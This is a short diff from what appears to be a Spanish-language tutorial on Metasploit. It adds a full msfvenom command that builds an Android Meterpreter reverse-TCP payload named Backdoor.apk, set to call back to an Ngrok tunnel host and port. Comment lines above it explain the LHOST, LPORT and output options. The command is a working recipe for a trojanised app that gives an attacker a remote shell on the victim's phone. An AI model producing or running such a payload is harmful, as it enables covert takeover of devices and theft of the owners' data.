@@ -104,4 +104,6 @@ Nota:
 	# LHOST = Dominio de Ngrok
 	# LPORT = Puerto de Ngrok (Se encuentra en el dominio de Ngrok)
 	# o = Exportar como un 'APK'
+
+❯ msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=14015 --platform android -a dalvik -f raw -o Backdoor.apk 
 ```
